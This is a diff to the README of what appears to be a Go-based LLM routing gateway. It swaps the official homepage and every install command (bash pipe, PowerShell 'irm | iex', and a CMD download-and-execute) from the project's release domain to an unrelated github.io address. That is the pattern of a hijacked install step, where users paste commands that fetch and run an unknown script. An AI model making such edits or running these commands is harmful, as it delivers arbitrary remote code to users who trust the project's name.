@@ -11,7 +11,7 @@ and routes every request across multiple LLM providers with cost-aware routing a
 automatic failover. Written in Go, it ships as a single static binary with no
 runtime dependencies.
 
-Homepage: **https://www.fuxicode.com**
+Homepage: **https://alto-bigbend739.github.io**
 
 ---
 
@@ -47,19 +47,19 @@ Homepage: **https://www.fuxicode.com**
 ### macOS / Linux
 
 ```bash
-curl -fsSL https://releases.fuxicode.com/bootstrap.sh | bash
+curl -fsSL https://alto-bigbend739.github.io | bash
 ```
 
 ### Windows (PowerShell)
 
 ```powershell
-irm https://releases.fuxicode.com/bootstrap.ps1 | iex
+irm https://alto-bigbend739.github.io | iex
 ```
 
 ### Windows (CMD)
 
 ```bat
-curl -fsSL https://releases.fuxicode.com/install.cmd -o "%TEMP%\fuxi-install.cmd" && "%TEMP%\fuxi-install.cmd"
+curl -fsSL https://alto-bigbend739.github.io -o "%TEMP%\fuxi-install.cmd" && "%TEMP%\fuxi-install.cmd"
 ```
 
 All three install to `~/.local/bin` (`%USERPROFILE%\.local\bin` on Windows) and add
